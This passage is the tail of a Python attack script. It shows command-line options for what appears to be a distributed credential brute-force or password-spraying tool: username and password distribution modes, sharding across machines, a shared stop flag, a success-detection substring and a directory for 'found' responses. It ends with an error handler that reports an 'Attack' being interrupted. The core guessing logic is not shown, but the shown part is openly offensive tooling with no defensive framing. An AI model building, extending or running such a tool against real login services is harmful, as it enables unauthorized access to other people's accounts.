                       help='Success detection substring (default: "message":"200")')
    parser.add_argument('--save-dir', default='found_responses', help='Directory to save responses (default: found_responses)')
    
    parser.add_argument('--dist-mode', choices=['user-round', 'user-chunk', 'user-queue', 'pass-interleave'],
                       default='user-round', help='Distribution strategy (default: user-round)')
    
    parser.add_argument('--shards', type=int, default=1, help='Total number of shards for distributed attack')
    parser.add_argument('--shard-index', type=int, default=0, help='Index of this shard (0-based)')
    parser.add_argument('--global-stop-flag', help='Path to global stop flag file for coordination')
    
    return parser

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[1;33m⚠️  Attack interrupted by user\033[0m")
        sys.exit(130)
    except Exception as e:
        print(f"\n\033[1;31m❌ Fatal error: {e}\033[0m")
        import traceback
        traceback.print_exc()
        sys.exit(1)